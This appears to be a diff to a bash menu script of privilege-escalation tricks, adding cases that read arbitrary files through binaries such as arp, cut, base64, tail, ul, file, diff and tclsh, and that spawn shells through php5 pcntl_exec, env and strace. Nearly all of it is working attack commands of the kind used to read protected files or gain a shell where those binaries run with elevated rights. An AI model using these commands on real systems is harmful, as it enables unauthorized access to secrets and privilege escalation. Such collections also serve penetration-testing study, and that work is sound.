@@ -784,6 +784,80 @@ while true; do
 			fi
 		fi
 	;;
+	"184")
+echo "Digit a file to read"
+read -p "(example, ./secret.txt): " RFL
+if [[ -f "$RFL" ]];
+then
+arp -v -f "$RFL"
+fi
+;;
+"185")
+echo "Digit a file to read"
+read -p "(example, ./secret.txt): " RFL
+if [[ -f "$RFL" ]];
+then
+cut -d "" -f1 "$RFL"
+fi
+;;
+"186")
+echo "Digit a file to read"
+read -p "(example, ./secret.txt): " RFL
+if [[ -f "$RFL" ]];
+then
+base64 "$RFL" | base64 --decode
+fi
+;;
+"187")
+echo "Digit a file to read"
+read -p "(example, ./secret.txt): " RFL
+if [[ -f "$RFL" ]];
+then
+tail "$RFL"
+fi
+;;
+"188")
+echo "Digit a file to read"
+read -p "(example, ./secret.txt): " RFL
+if [[ -f "$RFL" ]];
+then
+ul "$RFL"
+fi
+;;
+"189")
+php5 -r "pcntl_exec('/bin/sh');"
+;;
+"190")
+echo "Digit a file to read"
+read -p "(example, ./secret.txt): " RFL
+if [[ -f "$RFL" ]];
+then
+file -m "$RFL"
+fi
+;;
+"191")
+echo "Digit a file to read"
+read -p "(example, ./secret.txt): " RFL
+if [[ -f "$RFL" ]];
+then
+echo "digit exec cat ""$RFL"
+tclsh8.5
+fi
+;;
+"192")
+env /bin/sh
+;;
+"193")
+echo "Digit a file to read"
+read -p "(example, ./secret.txt): " RFL
+if [[ -f "$RFL" ]];
+then
+diff --line-format=%L /dev/null "$RFL"
+fi
+;;
+"194")
+strace -o /dev/null /bin/sh
+;;
 	*)
 		echo "error, invalid choice"
 	;;
